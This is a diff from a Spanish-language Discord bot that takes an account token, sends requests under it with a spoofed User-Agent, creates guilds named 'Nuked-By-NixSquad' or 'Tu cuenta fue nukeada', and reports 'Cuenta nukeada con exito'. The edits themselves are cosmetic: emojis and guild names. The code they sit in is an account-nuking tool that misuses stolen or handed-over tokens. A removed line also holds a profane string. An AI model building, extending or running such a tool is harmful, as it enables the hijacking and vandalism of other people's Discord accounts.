@@ -117,7 +117,7 @@ client.on('message', async message => {
 
             const tkn = token.content
 
-            message.channel.send("( <a:loading:850626288799449159> ) - Proceso Iniciado")
+            message.channel.send("( 💤 ) - Proceso Iniciado")
             // Definimos los valores de la peticion.
             const headers = {
                 "User-Agent": "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7",
@@ -125,8 +125,8 @@ client.on('message', async message => {
                 "Authorization": tkn
             }
             const guild = {
-                "icon": "tu-puta-madre/jpg",
-                "name": "Nuked-By-NixSquad",
+                "icon": "",
+                "name": "Tu cuenta fue nukeada",
                 "region": "us-west"
             }
             const limit = {
@@ -165,7 +165,7 @@ client.on('message', async message => {
                         }
                     })
                 }
-            }).then(message.channel.send("( <a:done:850626551292755998> ) - Cuenta nukeada con exito"))
+            }).then(message.channel.send("( ✅ ) - Cuenta nukeada con exito"))
           
         }).catch((err) => {
             console.log(err)
